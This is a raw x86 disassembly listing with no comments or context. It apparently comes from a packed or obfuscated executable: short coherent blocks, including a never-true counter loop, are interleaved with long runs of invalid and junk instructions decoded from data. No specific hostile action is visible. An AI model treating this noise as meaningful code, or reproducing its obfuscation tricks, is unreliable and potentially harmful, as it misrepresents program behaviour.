  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4336d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4336d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4336d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4336d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4336d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43371b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403ab4
  403acb:	add    ch,dh
  403acd:	sbb    DWORD PTR [eax],esp
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403ac2
  403ad7:	and    BYTE PTR ds:0x585de704,dl
  403add:	inc    edx
  403ade:	mov    ebx,0x36ae2661
  403ae3:	inc    esp
  403ae4:	jecxz  0x403a70
  403ae6:	stos   BYTE PTR es:[edi],al
  403ae7:	sub    BYTE PTR [edi+eiz*2+0x5873b9c],0x32
  403aef:	push   ecx
  403af0:	adc    bh,BYTE PTR [esi-0x6cfadf38]
  403af6:	sbb    BYTE PTR [ebp-0x45],dl
  403af9:	nop
  403afa:	in     al,0xe4
  403afc:	cld    
  403afd:	or     bl,ch
  403aff:	add    eax,0x4b5a2a8d
  403b04:	and    eax,0x1427173b
  403b09:	push   ss
  403b0a:	(bad)  
  403b0b:	(bad)  
  403b0c:	cmp    al,0xe9
  403b0e:	(bad)  
  403b0f:	call   0x9c9d02a5
  403b14:	cdq    
  403b15:	test   BYTE PTR [ecx+0x2dcd149b],0x72
  403b1c:	arpl   WORD PTR [edi-0x5fcfdb40],ax
  403b22:	out    0x3a,eax
  403b24:	shr    DWORD PTR [ebp-0x19815617],1
  403b2a:	inc    ebp
  403b2b:	sub    DWORD PTR [edx+0x8],0x395d747e
  403b32:	pusha  
  403b33:	and    DWORD PTR [ebp-0xc],ebp
  403b36:	push   0x64
  403b38:	inc    esp
  403b39:	fsubr  st,st(3)
  403b3b:	fld    TBYTE PTR [eax+ebp*4+0x5bf0ca44]
  403b42:	add    eax,0x176bfc53
  403b47:	dec    ebp
  403b48:	dec    ecx
  403b49:	mov    edi,0xc6d25316
  403b4e:	dec    eax
  403b4f:	in     al,0x50
  403b51:	xchg   ebp,eax
  403b52:	cmp    ecx,DWORD PTR [esi]
  403b54:	js     0x403ae4
  403b56:	aad    0x58
  403b58:	push   0x9be19554
  403b5d:	ja     0x403b98
  403b5f:	in     eax,dx
  403b60:	retf   
  403b61:	sar    DWORD PTR [esi],0xa4
  403b64:	lock jnp 0x403b12
  403b67:	(bad)  [ebp-0xa73c714]
  403b6d:	mov    esi,edx
  403b6f:	mov    bl,0x31
  403b71:	ds sar edx,1
  403b74:	hlt    
  403b75:	daa    
  403b76:	pop    esp
  403b77:	icebp  
  403b78:	pop    ecx
  403b79:	xor    ch,BYTE PTR [ebx]
  403b7b:	test   DWORD PTR [ebx+0x4a1ecd5],ecx
  403b81:	nop
  403b82:	jbe    0x403b19
  403b84:	clc    
  403b85:	pushf  
  403b86:	ficomp WORD PTR [ebx-0x30]
  403b89:	hlt    
  403b8a:	(bad)  
  403b8b:	out    0xce,eax
  403b8d:	stos   DWORD PTR es:[edi],eax
  403b8e:	int3   
  403b8f:	inc    ebp
  403b90:	inc    edx
  403b91:	mov    ebp,0x8b95a02f
  403b96:	fwait
  403b97:	or     DWORD PTR [edx],edi
  403b99:	sub    eax,0xbfa0d27d
  403b9e:	push   ds
  403b9f:	and    eax,0x5e18cabc
  403ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ba5:	jns    0x403bec
  403ba7:	lds    ecx,FWORD PTR [edi-0x79]
  403baa:	inc    ebp
  403bab:	push   es
  403bac:	xchg   ecx,eax
  403bad:	stc    
  403bae:	add    ebx,esi
  403bb0:	and    al,BYTE PTR [ebx]
  403bb2:	push   ds
  403bb3:	mov    esp,edx
  403bb5:	ins    BYTE PTR es:[edi],dx
  403bb6:	stc    
  403bb7:	jns    0x403c16
  403bb9:	xchg   esp,eax
  403bba:	and    dl,BYTE PTR [bp+si]
  403bbd:	clc    
  403bbe:	adc    al,0x82
  403bc0:	in     eax,dx
  403bc1:	ds inc ecx
  403bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bc4:	dec    esi
  403bc5:	scas   al,BYTE PTR es:[edi]
  403bc6:	bound  eax,QWORD PTR [eax+0x16a74f59]
  403bcc:	adc    ebx,ecx
  403bce:	adc    al,0xcc
  403bd0:	inc    eax
  403bd1:	fbstp  TBYTE PTR [edi-0x18521015]
  403bd7:	test   esi,ecx
  403bd9:	jns    0x403bbd
  403bdb:	and    eax,edx
  403bdd:	mov    eax,0xed20fe81
  403be2:	shl    BYTE PTR [ebx],cl
  403be4:	add    eax,0xff13cef8
  403be9:	loope  0x403c4c
  403beb:	mov    ch,0xd4
  403bed:	cmp    eax,0x25b4b764
  403bf2:	cli    
  403bf3:	ret    0x3b90
  403bf6:	lock fst DWORD PTR [edi+0x32]
  403bfa:	push   esi
  403bfb:	inc    esi
  403bfc:	jnp    0x403c4f
  403bfe:	icebp  
  403bff:	call   0x845e:0xc77bfcc
  403c06:	ins    DWORD PTR es:[edi],dx
  403c07:	mov    ebx,esi
  403c09:	xlat   BYTE PTR ds:[ebx]
  403c0a:	inc    edx
  403c0b:	jp     0x403c19
  403c0d:	repnz mov edi,0x48c742a0
  403c13:	adc    eax,0x4ec0c075
  403c18:	cld    
  403c19:	jo     0x403bd5
  403c1b:	sub    eax,0x164c39a9
  403c20:	push   esp
  403c21:	int3   
  403c22:	adc    al,0x2
  403c24:	je     0x403c84
  403c26:	jno    0x403ba8
  403c28:	retf   
  403c29:	mov    ah,0x55
  403c2b:	mov    ds:0xbc9cc839,eax
  403c30:	(bad)  
  403c31:	jbe    0x403c50
  403c33:	push   edx
  403c34:	(bad)  
  403c35:	mov    dh,bh
  403c37:	or     BYTE PTR [ecx-0x16187e79],0x27
  403c3e:	int    0xdc
  403c40:	popf   
  403c41:	cs sbb ch,bl
  403c44:	mov    al,ds:0x78b17808
  403c49:	xchg   ebx,eax
  403c4a:	int    0xe
  403c4c:	test   eax,0x7e91994d
  403c51:	les    ebx,FWORD PTR [edx-0x3fbdaf40]
  403c57:	inc    ecx
  403c58:	ds dec edi
  403c5a:	push   edi
  403c5b:	aas    
  403c5c:	retf   
  403c5d:	cmp    BYTE PTR [edx-0x23d00d92],dh
  403c63:	mov    dl,0x6f
  403c65:	in     eax,0x31
  403c67:	fisubr WORD PTR [ebx+0x25]
  403c6a:	sar    DWORD PTR [ecx+0x16d467cb],cl
  403c70:	mov    ebp,0xc5692d0
  403c75:	xor    al,0xc4
  403c77:	daa    
  403c78:	cmp    BYTE PTR [edi],cl
  403c7a:	out    0xc2,eax
  403c7c:	addr16 mov eax,0xac7197f8
  403c82:	test   ah,bl
  403c84:	adc    al,0xb5
  403c86:	jmp    0x403ce8
  403c88:	add    DWORD PTR [esi+0x364aa0b6],ebp
  403c8e:	mov    BYTE PTR [edi+0x9],ch
  403c91:	mov    ?,esp
  403c93:	aas    
  403c94:	mov    ds:0x32c097e4,al
  403c99:	inc    eax
  403c9a:	ins    BYTE PTR es:[edi],dx
  403c9b:	arpl   WORD PTR [esi+0x2],dx
  403c9e:	rol    ch,0x71
  403ca1:	mov    edx,0x5dc5433d
  403ca6:	jbe    0x403c51
  403ca8:	retf   
  403ca9:	js     0x403c69
  403cab:	inc    esp
  403cac:	adc    BYTE PTR [eax],dl
  403cae:	inc    edi
  403caf:	xchg   ebp,eax
  403cb0:	push   esp
  403cb1:	hlt    
  403cb2:	loopne 0x403d27
  403cb4:	adc    cl,cl
  403cb6:	fisttp DWORD PTR [ebp+0x4d]
  403cb9:	test   edi,ebp
  403cbb:	ficom  WORD PTR [ecx]
  403cbd:	mov    edi,0x50f65400
  403cc2:	prefetch BYTE PTR [eax+0x7f171a27]
  403cc9:	dec    edx
  403cca:	xchg   esi,eax
  403ccb:	jl     0x403c58
  403ccd:	sbb    ebp,DWORD PTR [ebx-0x7f26f6dd]
  403cd3:	and    al,0x1d
  403cd5:	rol    BYTE PTR [edi+eax*4-0x62],cl
  403cd9:	(bad)  
  403cda:	(bad)  
  403cdc:	adc    bh,BYTE PTR [ebx-0x5c]
  403cdf:	push   ebp
  403ce0:	xchg   BYTE PTR [esi+esi*2-0x74],dh
  403ce4:	pop    esi
  403ce5:	pop    ebx
  403ce6:	imul   eax,DWORD PTR [ebx],0xffffffb0
  403ce9:	jl     0x403c76
  403ceb:	int3   
  403cec:	and    BYTE PTR [ebx-0x25526e44],ch
  403cf2:	and    eax,0x123d0715
  403cf7:	mov    ecx,0xebc3687f
  403cfc:	out    dx,eax
  403cfd:	and    ecx,DWORD PTR [eax-0xc50f4e3]
  403d03:	and    BYTE PTR [edx+0x3c],cl
  403d06:	loop   0x403cfc
  403d08:	inc    ecx
  403d09:	test   eax,0x7769ae8f
  403d0e:	xor    BYTE PTR [esi-0x77],dh
  403d11:	rol    DWORD PTR [esi],cl
  403d13:	or     BYTE PTR [ebx+0x4f],dh
  403d16:	push   ebp
  403d17:	imul   edx,DWORD PTR ds:0xf4a399a2,0xffffffc3
  403d1e:	imul   edi,DWORD PTR [ebx+0x701195fd],0xfffffff2
  403d25:	ret    
  403d26:	mov    al,0x28
  403d28:	ret    0x53d5
  403d2b:	pop    esi
  403d2c:	or     eax,DWORD PTR [edx-0x32299132]
  403d32:	pop    esi
  403d33:	dec    ecx
  403d34:	or     esi,DWORD PTR [eax+0x117a1b5a]
  403d3a:	das    
  403d3b:	push   ecx
  403d3c:	test   DWORD PTR [edx*2+0x192d700a],esi
  403d43:	int    0xa2
  403d45:	xlat   BYTE PTR ds:[ebx]
  403d46:	pop    eax
  403d47:	mov    ecx,esp
  403d49:	mov    esp,esp
  403d4b:	and    ebp,DWORD PTR [edi]
  403d4d:	jge    0x403ceb
  403d4f:	jecxz  0x403dce
  403d51:	sti    
  403d52:	add    eax,DWORD PTR [edi-0x55]
  403d55:	retf   
  403d56:	jl     0x403d1a
  403d58:	scas   eax,DWORD PTR es:[edi]
  403d59:	mov    BYTE PTR [ebp-0x38],al
  403d5c:	or     BYTE PTR [edx-0x2c],0x65
  403d60:	ins    DWORD PTR es:[edi],dx
  403d61:	neg    BYTE PTR [ecx-0x54d97aaa]
  403d67:	mov    WORD PTR [esi+0x18ffc112],es
  403d6d:	dec    edi
  403d6e:	mov    ebp,DWORD PTR [ecx+0x13b24264]
  403d74:	in     eax,0xab
  403d76:	dec    esi
  403d77:	aad    0xcc
  403d79:	popf   
  403d7a:	imul   ebx,esi,0xca1472c5
  403d80:	mov    ch,0x56
  403d82:	mov    esi,0xe9b6fb0f
  403d87:	je     0x403d86
  403d89:	xchg   edx,eax
  403d8a:	jmp    0x6b6b:0x3d04b7da
  403d91:	push   esi
  403d92:	or     dl,BYTE PTR [ebx+eax*4+0x2759399a]
  403d99:	(bad)  
  403d9a:	mov    ds:0xdcca71e0,eax
  403d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403da0:	cwde   
  403da1:	stos   BYTE PTR es:[edi],al
  403da2:	fcmovnu st,st(3)
  403da4:	dec    esp
  403da5:	ds lahf 
  403da7:	pushf  
  403da8:	push   ecx
  403da9:	and    ch,BYTE PTR [esi+ebx*8]
  403dac:	(bad)
  403daf:	push   0xffffffcb
  403db1:	lahf   
  403db2:	mov    BYTE PTR [edi+0x11ee523],bl
  403db8:	mov    bh,0x95
  403dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dbb:	(bad)  
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffff9b
  403e75:	dec    ebx
  403e76:	xlat   BYTE PTR ds:[ebx]
  403e77:	repz or bl,BYTE PTR [edi]
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e65
  403e81:	inc    esi
  403e82:	and    ebx,ecx
  403e84:	push   ebp
  403e85:	mov    ah,0x6a
  403e87:	ins    BYTE PTR es:[edi],dx
  403e88:	jle    0x403e88
  403e8a:	push   es
  403e8b:	pop    ebx
  403e8c:	pusha  
  403e8d:	jne    0x403eec
  403e8f:	call   0xe7e0:0x6cccab72
  403e96:	sub    al,0xfc
  403e98:	loop   0x403efd
  403e9a:	outs   dx,DWORD PTR ds:[esi]
  403e9b:	mov    ds:0xe5827e24,al
  403ea0:	shl    BYTE PTR [edx],1
  403ea2:	add    BYTE PTR [ebx+edx*1],bh
  403ea5:	or     eax,0x37c70cc5
  403eaa:	pop    ebx
  403eab:	pop    ebp
  403eac:	and    ch,dl
  403eae:	adc    DWORD PTR ds:0xaf12ee7e,edx
  403eb4:	and    DWORD PTR [ebx+0x2f304b9c],eax
  403eba:	inc    edi
  403ebb:	mov    edx,0x71c9e40a
  403ec0:	jmp    0xedb7:0x8a6ef8d0
  403ec7:	loope  0x403e65
  403ec9:	retf   0x31b8
  403ecc:	fisttp WORD PTR [eax+0xaaf8e6f]
  403ed2:	xor    ebp,DWORD PTR [esi]
  403ed4:	push   ss
  403ed5:	test   al,0x92
  403ed7:	loope  0x403f03
  403ed9:	dec    esi
  403eda:	mov    al,0x24
  403edc:	add    eax,DWORD PTR [ebx-0x51]
  403edf:	lock imul ebp,DWORD PTR [ebp-0x1],0xffffffaa
  403ee4:	aam    0x19
  403ee6:	ja     0x403ec5
  403ee8:	loopne 0x403e7c
  403eea:	and    eax,0xa2b81291
  403eef:	ror    DWORD PTR [esp+esi*1-0x7e2d16b4],cl
  403ef6:	int    0xa6
  403ef8:	aam    0x7a
  403efa:	icebp  
  403efb:	xchg   edi,eax
  403efc:	repnz pop ebx
  403efe:	aaa    
  403eff:	push   ecx
  403f00:	add    bh,BYTE PTR [edx]
  403f02:	je     0x403e8e
  403f04:	loopne 0x403e9c
  403f06:	push   esp
  403f07:	sar    DWORD PTR [edx],cl
  403f09:	outs   dx,BYTE PTR ds:[esi]
  403f0a:	sub    DWORD PTR [edx-0xf],ebp
  403f0d:	mov    ebp,gs
  403f0f:	out    dx,eax
  403f10:	and    BYTE PTR [edi+0x201cacee],ah
  403f16:	mov    al,ds:0x5dba56ec
  403f1b:	out    dx,eax
  403f1c:	add    BYTE PTR [edi],dh
  403f1e:	add    eax,0xdd4f8168
  403f23:	out    dx,al
  403f24:	sub    eax,0x16c892ed
  403f29:	test   al,0x50
  403f2b:	sbb    BYTE PTR [ecx+esi*4-0x57],0x55
  403f30:	push   ss
  403f31:	lods   eax,DWORD PTR ds:[esi]
  403f32:	iret   
  403f33:	and    bl,bh
  403f35:	dec    eax
  403f36:	cmp    dl,BYTE PTR es:[edx-0x425702bc]
  403f3d:	icebp  
  403f3e:	ficom  DWORD PTR [esi-0x1a]
  403f41:	leave  
  403f42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f43:	xor    al,BYTE PTR [eax-0x12]
  403f46:	xchg   edi,eax
  403f47:	xor    al,0x6
  403f49:	inc    ebx
  403f4a:	in     eax,dx
  403f4b:	and    ecx,DWORD PTR [eax-0x64]
  403f4e:	lea    eax,[ecx]
  403f50:	div    BYTE PTR ds:0xbec5728c
  403f56:	push   0xffffffa4
  403f58:	jmp    0x403f5d
  403f5a:	jg     0x403f92
  403f5c:	rcl    BYTE PTR [eax+0x122346c],cl
  403f62:	ins    BYTE PTR es:[edi],dx
  403f63:	xchg   edx,eax
  403f64:	mov    edx,edi
  403f66:	push   edx
  403f67:	dec    ebp
  403f68:	sti    
  403f69:	mov    eax,0xa8825215
  403f6e:	mov    bl,0xa7
  403f70:	cmp    al,0x1b
  403f72:	test   DWORD PTR [eax],0x24248fff
  403f78:	lahf   
  403f79:	or     DWORD PTR [ebp+0x64beabd1],edi
  403f7f:	dec    ebx
  403f80:	daa    
  403f81:	loop   0x403f71
  403f83:	lock cmp cl,bl
  403f86:	sbb    dl,cl
  403f88:	jae    0x403f29
  403f8a:	jge    0x403fa8
  403f8c:	xor    dl,al
  403f8e:	pushf  
  403f8f:	jmp    0xf0818b3c
  403f94:	sub    al,0xc6
  403f96:	adc    DWORD PTR [ebp-0x48fe068c],0x11a0e912
  403fa0:	idiv   DWORD PTR [edi+edi*1]
  403fa3:	mov    ebp,ebp
  403fa5:	push   cs
  403fa6:	cli    
  403fa7:	loope  0x403fc0
  403fa9:	inc    ecx
  403faa:	inc    ecx
  403fab:	inc    esi
  403fac:	popf   
  403fad:	(bad)  
  403fae:	or     eax,0xc3e908ca
  403fb3:	mov    ecx,0x51f3c2a0
  403fb8:	pop    edx
  403fb9:	push   cs
  403fba:	(bad)  
  403fbb:	ds pop eax
  403fbd:	les    esp,FWORD PTR [eax-0x24]
  403fc0:	ror    BYTE PTR [ecx+0x52],1
  403fc3:	ja     0x403f7d
  403fc5:	aaa    
  403fc6:	das    
  403fc7:	pushf  
  403fc8:	push   esi
  403fc9:	fild   DWORD PTR [ecx+eax*1]
  403fcc:	sub    ebp,DWORD PTR ss:[esi]
  403fcf:	push   esp
  403fd0:	neg    ah
  403fd2:	xor    BYTE PTR ds:0xfd4adae,ah
  403fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fd9:	inc    ebp
  403fda:	jnp    0x403fb2
  403fdc:	sbb    eax,DWORD PTR [esi+0x27]
  403fdf:	jle    0x403fe9
  403fe1:	stos   DWORD PTR es:[edi],eax
  403fe2:	jno    0x403f85
  403fe4:	enter  0x992b,0x1
  403fe8:	test   DWORD PTR [edi+esi*2+0x41],0x28af5696
  403ff0:	js     0x403fd3
  403ff2:	divps  xmm5,XMMWORD PTR [ebx+0x7a]
  403ff6:	jg     0x403fe4
  403ff8:	push   edx
  403ff9:	mov    ebx,0x27f17d42
  403ffe:	sub    cl,bl
  404000:	cmp    dh,BYTE PTR [eax+edx*8]
  404003:	jb     0x40401f
  404005:	or     DWORD PTR [esi],0xffffffa1
  404008:	gs jl  0x403fff
  40400b:	inc    edx
  40400c:	xor    DWORD PTR [ebx+esi*1],edx
  40400f:	xlat   BYTE PTR ds:[ebx]
  404010:	push   ecx
  404011:	mov    al,0x88
  404013:	jmp    0x125d:0xd4245d41
  40401a:	into   
  40401b:	ja     0x403fd2
  40401d:	je     0x403fa2
  40401f:	cmp    al,0x53
  404021:	push   eax
  404022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404023:	push   edx
  404024:	and    dl,BYTE PTR [edi]
  404026:	sbb    DWORD PTR [eax],0x60
  404029:	mov    dh,bl
  40402b:	push   ebp
  40402c:	mov    al,ds:0xfc3db65d
  404031:	cmp    BYTE PTR [esi+0x67468ea0],dl
  404037:	out    0x82,eax
  404039:	mov    esp,0x84e2709
  40403e:	imul   esp,DWORD PTR [ecx+0x6b00eb13],0xabfab231
  404048:	add    BYTE PTR [ecx+0x5b],ch
  40404b:	shl    BYTE PTR [eax],1
  40404d:	sbb    BYTE PTR [ecx-0x22f5884d],bh
  404053:	mov    esi,0x50a8eee9
  404058:	fisttp DWORD PTR [esi-0x75]
  40405b:	ret    
  40405c:	lds    ebp,FWORD PTR ds:0xd3232427
  404062:	or     BYTE PTR [ebx+0xcb6f8f8],dh
  404068:	inc    ecx
  404069:	bound  edx,QWORD PTR [eax-0x49]
  40406c:	xor    ch,BYTE PTR [ebx+0x59]
  40406f:	fsub   QWORD PTR [ecx]
  404071:	test   eax,0x84300a0e
  404076:	hlt    
  404077:	push   ebp
  404078:	pushf  
  404079:	arpl   WORD PTR [edx+0x40],ax
  40407c:	push   ebx
  40407d:	scas   eax,DWORD PTR es:[edi]
  40407e:	jae    0x4040fc
  404080:	nop
  404081:	ja     0x4040b8
  404083:	mov    ds:0xde69f32f,eax
  404088:	and    eax,0x7e527548
  40408d:	fisub  DWORD PTR [eax-0x2a]
  404090:	adc    eax,0x2a6afee9
  404095:	in     eax,0x9a
  404097:	jge    0x40403a
  404099:	outs   dx,BYTE PTR fs:[esi]
  40409b:	loopne 0x404034
  40409d:	in     eax,dx
  40409e:	mov    ds:0x677e42ea,eax
  4040a3:	push   cs
  4040a4:	mov    al,0xcd
  4040a6:	sub    al,0x2b
  4040a8:	xchg   edx,eax
  4040a9:	push   eax
  4040aa:	jecxz  0x4040be
  4040ac:	push   edx
  4040ad:	mov    dh,BYTE PTR [ecx]
  4040af:	push   ecx
  4040b0:	xchg   ebx,eax
  4040b1:	dec    edx
  4040b2:	cli    
  4040b3:	rcl    DWORD PTR es:[ebx+0xa],1
  4040b7:	lods   al,BYTE PTR ds:[esi]
  4040b8:	adc    eax,0x6f9cc919
  4040bd:	sbb    eax,0xd3f43298
  4040c2:	loope  0x40412b
  4040c4:	lock ins BYTE PTR es:[edi],dx
  4040c6:	mov    eax,ds:0x899ff6c0
  4040cb:	sbb    BYTE PTR [eax-0x1ec623f8],0xc6
  4040d2:	inc    edx
  4040d3:	out    dx,al
  4040d4:	push   ecx
  4040d5:	out    dx,eax
  4040d6:	ja     0x40406f
  4040d8:	mov    WORD PTR [eax],?
  4040da:	out    0xb5,al
  4040dc:	xchg   BYTE PTR [eax],bl
  4040de:	jge    0x4040d6
  4040e0:	push   cs
  4040e1:	dec    esi
  4040e2:	pop    edi
  4040e3:	(bad)  
  4040e4:	xchg   edx,eax
  4040e5:	or     BYTE PTR gs:[eax],al
  4040e8:	jbe    0x404101
  4040ea:	outs   dx,BYTE PTR ds:[esi]
  4040eb:	repz fiadd WORD PTR [esi+0x1a29c3b9]
  4040f2:	ss xchg esi,eax
  4040f4:	xchg   edx,eax
  4040f5:	das    
  4040f6:	push   cs
  4040f7:	jbe    0x404101
  4040f9:	call   0xe4c943b
  4040fe:	in     eax,dx
  4040ff:	jb     0x404146
  404101:	out    0x7,eax
  404103:	std    
  404104:	sub    al,0xb3
  404106:	in     al,0x36
  404108:	dec    eax
  404109:	arpl   ax,di
  40410b:	or     BYTE PTR [eax+0x3b],bl
  40410e:	das    
  40410f:	push   ecx
  404110:	mov    dh,0x27
  404112:	loopne 0x40412b
  404114:	pop    es
  404115:	aam    0x35
  404117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404118:	or     ch,cl
  40411a:	imul   ebp,DWORD PTR [esi+0x4c],0x65
  40411e:	test   BYTE PTR [edi],dl
  404120:	ins    BYTE PTR es:[edi],dx
  404121:	call   0xfae359ed
  404126:	lahf   
  404127:	mov    cl,0x4d
  404129:	xor    BYTE PTR [edx+0x31],ch
  40412c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40412d:	sbb    al,0x6b
  40412f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404130:	push   ds
  404131:	push   ecx
  404132:	ds out dx,eax
  404134:	ja     0x404166
  404136:	out    dx,eax
  404137:	in     al,dx
  404138:	xlat   BYTE PTR ds:[ebx]
  404139:	repz shl DWORD PTR [eax-0x5e],cl
  40413d:	adc    bl,BYTE PTR [ecx-0x7deb8e8e]
  404143:	stos   DWORD PTR es:[edi],eax
  404144:	pop    ebp
  404145:	mov    ch,0xc9
  404147:	jbe    0x4040fc
  404149:	leave  
  40414a:	mov    ds:0x2b8f90fd,eax
  40414f:	hlt    
  404150:	jp     0x40414d
  404152:	mov    ds:0x21ca6c53,eax
  404157:	adc    BYTE PTR [ecx],cl
  404159:	or     BYTE PTR [ebx],al
  40415b:	pop    ds
  40415c:	jl     0x404110
  40415e:	xchg   ebx,eax
  40415f:	inc    esi
  404160:	cmp    ebx,DWORD PTR [ebx+0x5a]
  404163:	aad    0x4c
  404165:	jns    0x404192
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [edx+0x7b],bl
  40418c:	cmp    esi,DWORD PTR [esi]
  40418e:	je     0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x404170
  404197:	inc    eax
  404198:	ret    
  404199:	inc    esp
  40419a:	jmp    0x47d9ec0
  40419f:	add    eax,0x9c4d658d
  4041a4:	cld    
  4041a5:	cmp    ch,BYTE PTR [ebx-0x45]
  4041a8:	lods   eax,DWORD PTR ds:[esi]
  4041a9:	retf   0x39aa
  4041ac:	sub    al,0x6
  4041ae:	in     al,dx
  4041af:	lea    ebx,[ecx+0x7c865467]
  4041b5:	shl    BYTE PTR [edi-0x74],0xbc
  4041b9:	fwait
  4041ba:	cmp    edx,DWORD PTR [eax-0x54ae2364]
  4041c0:	and    dl,0x88
  4041c3:	xchg   DWORD PTR [eax-0x23],esp
  4041c6:	mov    al,ds:0x59c8165c
  4041cb:	rol    DWORD PTR ds:0xe28414c3,1
  4041d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041d2:	(bad)  
  4041d3:	xor    ebx,DWORD PTR [eax-0x555ef48a]
  4041d9:	cmp    dl,BYTE PTR [ecx-0x5581481c]
  4041df:	repnz push edi
  4041e1:	push   eax
  4041e2:	stc    
  4041e3:	mov    ds:0xa4bc5e9f,al
  4041e9:	out    0x64,eax
  4041eb:	sahf   
  4041ec:	pushf  
  4041ed:	popa   
  4041ee:	or     eax,0xff714660
  4041f3:	fstp   DWORD PTR [edi]
  4041f5:	or     ebp,DWORD PTR [ebx+0x4818091d]
  4041fb:	jnp    0x404261
  4041fd:	sub    al,0xde
  4041ff:	add    ch,dh
  404201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404202:	bound  ebx,QWORD PTR [ecx+0x17]
  404205:	cmp    al,0xae
